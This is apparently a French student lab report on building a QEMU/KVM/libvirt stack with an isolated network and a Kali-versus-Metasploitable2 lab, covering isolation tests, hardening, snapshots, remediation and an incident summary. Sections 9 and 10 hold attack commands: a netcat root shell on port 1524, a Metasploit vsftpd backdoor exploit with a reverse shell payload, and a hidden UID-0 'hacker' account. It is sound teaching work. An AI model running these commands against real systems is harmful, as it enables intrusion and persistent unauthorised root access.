# TP QEMU, KVM & libvirt : pile de virtualisation et mini-lab offensif isolé

Projet réalisé dans le cadre du cursus Administration système & Cybersécurité (Bac+3) à La Plateforme (Marseille).

Mise en place d'une pile de virtualisation complète (QEMU, KVM, libvirt, virt-manager), d'un réseau virtuel **isolé**, et d'un mini-lab offensif (VM attaquant / VM victime) pour manipuler l'isolation, les snapshots, le scan de vulnérabilités et la remédiation après incident.

---

## 1. Architecture

Le lab tourne en **virtualisation imbriquée** : poste Windows → VMware → une VM Ubuntu qui sert d'hôte KVM → les VM du lab.

```
Windows 11 (16 Go RAM)
│
└─ VMware Workstation  (case "Virtualiser Intel VT-x/EPT" cochée)
   └─ Ubuntu 26.04.1 LTS  ← hôte KVM/libvirt (8 Go RAM, 4 vCPU)
      │
      ├─ réseau "default"   (NAT,   virbr0, 192.168.122.0/24)  → internet
      │   └─ vm-auto          (Ubuntu cloud + cloud-init)   [démo automatisation]
      │
      └─ réseau "lab-isole" (isolé, virbr1, 172.16.50.0/24) → AUCUNE sortie
          ├─ kali             172.16.50.107   [attaquant]
          └─ metasploitable2  172.16.50.115   [victime]
```

**Pourquoi imbriqué :** le sujet impose KVM/libvirt, qui n'existent que sous Linux. Faire tourner l'hôte KVM dans une VM VMware ajoute une couche d'isolation : même en cas d'évasion d'une VM du lab, on retombe dans une VM jetable, pas sur le poste Windows.

Versions utilisées : **libvirt 12.0.0** et **QEMU 10.2.1** (ligne « Exécution de l'hyperviseur » de `virsh version`).

### Les machines virtuelles

| VM | Rôle | Réseau | RAM / vCPU | Matériel virtuel | Justification |
|----|------|--------|-----------|------------------|---------------|
| `vm-auto` | Démo automatisation | default (NAT) | 1 Go / 1 | virtio, q35 | Image cloud récente, besoin d'internet pour cloud-init |
| `metasploitable2` | Victime | lab-isole | 512 Mo / 1 | IDE, machine `pc`, carte `e1000` | Système de 2008 : ne connaît que du vieux matériel |
| `kali` | Attaquant | lab-isole | 2 Go / 2 | virtio, q35 | Système récent : gère le matériel moderne, plus rapide |

Le contraste Metasploitable / Kali illustre une règle : **on adapte le matériel virtuel à l'âge du système invité.**

---

## 2. Prérequis sur l'hôte

Vérification de la virtualisation matérielle avant toute chose (script `scripts/verif_hote.sh`) : présence de `vmx`/`svm` dans `/proc/cpuinfo` et du périphérique `/dev/kvm`.

Installation de la pile :

```bash
sudo apt update
sudo apt install qemu-system-x86 libvirt-daemon-system libvirt-clients virtinst virt-manager
sudo usermod -aG libvirt,kvm $USER
```

- `qemu-system-x86` : le moteur qui fait tourner les VM.
- `libvirt-daemon-system` : le service de gestion (API, réseaux, disques).
- `libvirt-clients` : la commande `virsh`.
- `virtinst` : la commande `virt-install`.
- `virt-manager` : l'interface graphique.
- Les groupes `libvirt` et `kvm` permettent de gérer les VM sans `sudo`. Ce sont eux qui servent de **contrôle d'accès** : un utilisateur hors de ces groupes ne peut pas piloter les VM.

Vérification : `virt-host-validate qemu` renvoie `PASS` sur les points essentiels. Les trois `WARN` (cgroup `devices`, IOMMU, secure guest) sont normaux dans une VM VMware sous cgroup v2 et ne gênent pas le projet.

---

## 3. Le réseau isolé

Fichier `reseaux/lab-isole.xml` :

```xml
<network>
  <name>lab-isole</name>
  <bridge name='virbr1'/>
  <ip address='172.16.50.1' netmask='255.255.255.0'>
    <dhcp>
      <range start='172.16.50.100' end='172.16.50.200'/>
    </dhcp>
  </ip>
</network>
```

**Le point clé : l'absence de balise `<forward>`.** C'est elle qui rend le réseau isolé. Sans `<forward>`, le switch virtuel `virbr1` n'est relié à aucun routeur : aucune route vers internet ni vers le réseau VMware. libvirt ajoute en plus des règles de pare-feu qui rejettent tout trafic sortant de `virbr1`.

L'adresse `172.16.50.1` est celle de l'hôte sur ce réseau. Elle est nécessaire pour le DHCP, mais elle rend l'hôte joignable depuis le lab : ce point est traité à la section 6.

Mise en service :

```bash
virsh net-define reseaux/lab-isole.xml
virsh net-start lab-isole
virsh net-autostart lab-isole
```

`net-define` enregistre le réseau de façon permanente (différent de `net-create`, temporaire). `net-autostart` le relance à chaque démarrage de l'hôte.

---

## 4. Automatisation (cloud-init + virt-install)

La VM `vm-auto` est créée en une commande à partir d'une **image cloud** (système déjà installé, configuré au premier démarrage par cloud-init).

Fichiers dans `cloud-init/` :
- `meta-data` : identité de la VM (nom, instance-id).
- `user-data` : utilisateur, clé SSH, mot de passe (sous forme de **hash**, jamais en clair), paquet `qemu-guest-agent`, et `ssh_pwauth: false` pour interdire la connexion SSH par mot de passe.

Le script `scripts/creer_vm.sh` enchaîne les vérifications préalables (fichiers présents, image présente, VM inexistante) puis lance `virt-install --import` avec le disque cloud et les fichiers cloud-init. Il **refuse** d'écraser une VM existante : un script qui détruit sans prévenir est dangereux.

Choix de sécurité vérifiés sur la VM obtenue :
- `sudo` demande le mot de passe (pas de `NOPASSWD`).
- la connexion SSH par mot de passe est refusée (`Permission denied (publickey)`), seule la clé fonctionne.
- l'agent `qemu-guest-agent` répond à libvirt (`virsh domifaddr vm-auto --source agent`).

> Piège rencontré : `cloud-init schema` valide la **forme** du YAML, pas le **contenu**. Une clé SSH mal collée passe la validation mais laisse `authorized_keys` vide. Seul un test réel (connexion SSH) l'a révélé.

---

## 5. Tests d'isolation

Objectif : prouver que le lab ne peut pas sortir, même face à un attaquant actif.

| Test | Méthode | Résultat |
|------|---------|----------|
| Pas de passerelle | `ping 8.8.8.8` depuis une VM du lab | `Network is unreachable` (aucune route donnée par le DHCP) |
| Route forcée par l'attaquant | `ip route add default via 172.16.50.1` puis `ping 8.8.8.8` | Bloqué : `Destination Port Unreachable`, l'hôte rejette |
| Rien ne sort vers VMware | `tcpdump -i ens33 icmp` pendant l'attaque | **0 paquet capturé** sur la carte de sortie |
| Pare-feu de l'hôte | `nft list ruleset \| grep virbr1` | règle `reject`, compteur = 6 paquets (nos 6 pings bloqués) |
| Pas de fuite DNS | `nslookup kali.org 172.16.50.1` | `REFUSED` : le DNS du lab ne relaie rien vers internet |

Conclusion : l'isolation tient par le réseau (pas de `<forward>`), par le pare-feu libvirt, et par l'absence de résolution DNS externe.

---

## 6. Durcissement de l'hôte

Les tests ont montré un point ouvert : **depuis le lab, Kali pouvait joindre l'hôte** (le DHCP impose l'IP `172.16.50.1`). On restreint cet accès au strict nécessaire (DHCP + DNS), tout le reste est bloqué.

Script `scripts/durcir_hote.sh` :

```bash
#!/bin/bash

if sudo iptables -C INPUT -i virbr1 -j DROP 2>/dev/null; then
    echo "Regles deja en place"
    exit 0
fi

sudo iptables -A INPUT -i virbr1 -p udp --dport 67 -j ACCEPT
sudo iptables -A INPUT -i virbr1 -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -i virbr1 -p tcp --dport 53 -j ACCEPT
sudo iptables -A INPUT -i virbr1 -j DROP

echo "Hote durci : lab -> hote limite au DHCP et au DNS"
```

La chaîne `INPUT` filtre ce qui est destiné à l'hôte. On autorise le DHCP (port 67) et le DNS (port 53), puis on jette tout le reste venant de `virbr1`. Après application, un `ping` de Kali vers l'hôte échoue, mais Kali ↔ Metasploitable fonctionne toujours, et le DHCP continue de distribuer les adresses.

Côté services exposés, un scan de l'hôte depuis Kali (`nmap 172.16.50.1`) ne montre **qu'un seul port**, le 53 (le DNS `dnsmasq` de libvirt), à comparer à la vingtaine de ports de la victime.

Autres points de durcissement :
- les VM tournent sous l'utilisateur **`libvirt-qemu`**, pas `root` : une évasion de QEMU tomberait sur un compte sans privilèges.
- le filtre réseau `no-mac-spoofing` (voir section 10) empêche une VM d'usurper une adresse MAC.

> Leçon : `virsh net-destroy` sur un réseau dont les VM tournent **débranche ces VM du switch**. Il faut éteindre les VM avant de toucher au réseau. Les règles iptables ajoutées à la main survivent à un `net-destroy` (ce ne sont pas des règles libvirt) mais pas à un redémarrage de l'hôte : d'où le script, à relancer au boot.

---

## 7. Snapshots

Snapshot pris **VM éteinte** : disque cohérent, pas de RAM sauvegardée, stockage **interne** au fichier qcow2.

```bash
virsh shutdown metasploitable2
virsh snapshot-create-as metasploitable2 --name avant-attaque --description "Etat propre avant le lab"
```

Le retour en arrière a été testé réellement : création d'un fichier témoin, `snapshot-revert`, et vérification que le fichier avait disparu. **On ne fait pas confiance à une sauvegarde qu'on n'a jamais restaurée.**

---

## 8. Scan et identification des vulnérabilités

Depuis Kali, sur le réseau isolé uniquement (scanner sans autorisation est illégal ; ici, notre réseau, notre VM).

- `nmap -sn 172.16.50.0/24` → découverte : exactement 3 machines (hôte, Kali, victime). Aucune intruse = isolation confirmée.
- `nmap -sV 172.16.50.115` → une vingtaine de services, presque tous dans des versions de 2008.

Services les plus parlants :

| Port | Service / version | Problème |
|------|-------------------|----------|
| 21 | vsftpd 2.3.4 | version piégée (porte dérobée déclenchée par un nom finissant par `:)`) |
| 1524 | Metasploitable root shell | shell root déjà ouvert, sans authentification |
| 6667 | UnrealIRCd | porte dérobée d'exécution de commandes |
| 139/445 | Samba 3.x | exécution de code à distance connue |

Méthode retenue : **logiciel + version → faille connue (CVE)**. La longueur de la liste est elle-même un constat : un serveur bien administré n'expose que les services utiles.

---

## 9. Exploitation

Deux niveaux, du plus simple au plus réaliste.

**1. Accès trivial (port 1524)**

```bash
nc 172.16.50.115 1524
# -> invite root immediate, uid=0(root)
```

Aucun exploit : un shell root écoute déjà. Démonstration qu'un service exposé peut donner un accès root sans la moindre authentification.

**2. Vrai exploit (vsftpd 2.3.4, via Metasploit)**

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.16.50.115
set PAYLOAD cmd/unix/reverse_perl
set LHOST 172.16.50.107
run
# -> Backdoor has been spawned! Command shell session opened -> uid=0(root)
```

Ici on **déclenche** une faille d'une version précise pour obtenir le shell. Metasploit lit d'abord la bannière (`vsFTPd 2.3.4`), confirme la vulnérabilité, puis ouvre une session root. C'est la chaîne complète : scan → identification → exploitation.

> Un payload léger (`cmd/unix/reverse_perl`) a été choisi plutôt que le meterpreter par défaut, trop lourd pour ce système de 2008.

---

## 10. Incident et remédiation

**Scénario d'incident** (depuis Kali, via le shell root du port 1524) :

```sh
useradd -ou 0 -g 0 hacker            # second compte root, discret
echo "systeme compromis" > /root/intrusion.txt
```

L'attaquant crée une porte dérobée (compte `hacker` avec UID 0) et dépose un fichier. La compromission persiste après reconnexion.

**Restauration** : retour au snapshot sain.

```bash
virsh snapshot-revert metasploitable2 avant-attaque
```

Après restauration, le compte `hacker` et le fichier `intrusion.txt` ont disparu : l'état propre est retrouvé.

**Remédiation** (fermer les portes, pas seulement nettoyer) :

*Port 1524* — le shell root est lancé par `inetd` via la ligne `ingreslock` de `/etc/inetd.conf`. On la supprime, puis on force inetd à relire sa config :

```sh
sed -i '/ingreslock/d' /etc/inetd.conf
kill -HUP <pid_inetd>
```

> Leçon : un simple `restart` du service n'avait pas rechargé la configuration (l'ancien processus restait en mémoire). Seule la vérification depuis l'extérieur (`nmap -p 1524` → `closed`) l'a révélé. **Une remédiation n'est terminée qu'une fois vérifiée depuis l'extérieur.**

*Port 21 (vsftpd)* — ici une erreur de diagnostic instructive : vsftpd n'est pas un service autonome mais lancé par **xinetd** (confirmé par `netstat -ltnp` → `4544/xinetd`). Tuer vsftpd ou redémarrer la VM ne servait à rien tant que xinetd tenait le port. La bonne remédiation est au niveau de xinetd :

```sh
# dans /etc/xinetd.d/vsftpd
disable = yes
# puis
/etc/init.d/xinetd restart
```

Résultat : `nmap -p 21` passe de `open` à `closed`, et ça tient au redémarrage (config sur disque).

> Leçon : Metasploitable démarre ses services par **trois mécanismes** (xinetd pour le FTP, openbsd-inetd pour le 1524, rc.local pour UnrealIRCd / RMI / VNC). Identifier le bon gestionnaire est la clé du durcissement.

### Compte-rendu d'incident (synthèse)

1. **Détection** : scan nmap, services obsolètes, puis découverte du compte `hacker` (UID 0) dans `/etc/passwd`.
2. **Confinement** : le lab était déjà isolé, aucun risque de propagation hors de l'environnement.
3. **Éradication / restauration** : retour au snapshot `avant-attaque`, disparition des traces.
4. **Remédiation** : fermeture des services exploités (1524 via inetd, 21 via xinetd), vérifiée depuis Kali.
5. **Durcissement** : désactivation des services inutiles (réduction de la surface d'attaque), restriction de l'accès à l'hôte.

---

## 11. Durcissement complémentaire – filtrage libvirt (nwfilter)

Mesure supplémentaire : empêcher une VM d'**usurper une adresse MAC** (base de l'ARP spoofing / interception). libvirt pose un filtre directement au niveau de la carte réseau de la VM.

Dans la config de la VM (`virsh edit kali`), à l'intérieur du bloc `<interface>` :

```xml
<filterref filter='no-mac-spoofing'/>
```

Après redémarrage de la VM, le switch n'accepte de cette interface que les trames dont la MAC source correspond à celle attribuée. Si Kali change sa MAC, ses trames sont jetées par l'hôte, que la VM soit d'accord ou non.

---

## 12. Structure du dépôt

```
tp-qemu-libvirt/
├── README.md
├── .gitignore
├── reseaux/
│   ├── lab-isole.xml           # réseau isolé (source)
│   └── lab-isole-actif.xml     # export libvirt (avec uuid/mac)
├── vms/
│   ├── metasploitable2.xml     # topologie exportée (virsh dumpxml)
│   ├── kali.xml
│   └── vm-auto.xml
├── cloud-init/
│   ├── meta-data
│   └── user-data               # contient un hash de mot de passe, pas de clair
└── scripts/
    ├── verif_hote.sh
    ├── creer_vm.sh
    └── durcir_hote.sh
```

Les images disque (`.qcow2`, `.img`, `.vmdk`) ne sont **pas** versionnées : trop volumineuses, et récupérables depuis les sources officielles. La clé SSH privée n'est jamais committée (seule la publique est dans `user-data`).

Export des topologies :

```bash
virsh net-dumpxml lab-isole > reseaux/lab-isole-actif.xml
virsh dumpxml metasploitable2 > vms/metasploitable2.xml
virsh dumpxml kali > vms/kali.xml
virsh dumpxml vm-auto > vms/vm-auto.xml
```

---

## 13. Compétences couvertes

| Compétence | Où |
|-----------|-----|
| BC01·C4 – administrer/sécuriser une infra virtualisée | §2, §3, §6, §7 |
| BC01·C1 – bonnes pratiques (rigueur, doc, vérifs préalables) | `verif_hote.sh`, vérifs de `creer_vm.sh`, vérif des empreintes SHA256 |
| BC01·C2 – réseaux virtuels isolés | §3, §5, §11 |
| BC02·C5/C6 – automatisation (cloud-init, virt-install) | §4 |
| BC03·C8 – mesurer la sécurité (scan, vulnérabilités) | §8, §9 |
| BC03·C10 – détecter et traiter un incident | §10 |

---

## 14. Sources

- Documentation QEMU, KVM, libvirt, virt-manager (sites officiels)
- Metasploitable 2 (Rapid7 / SourceForge) – intégrité vérifiée par empreinte SHA256
- Kali Linux – image QEMU officielle, intégrité vérifiée par SHA256
- cloud-init (documentation officielle)
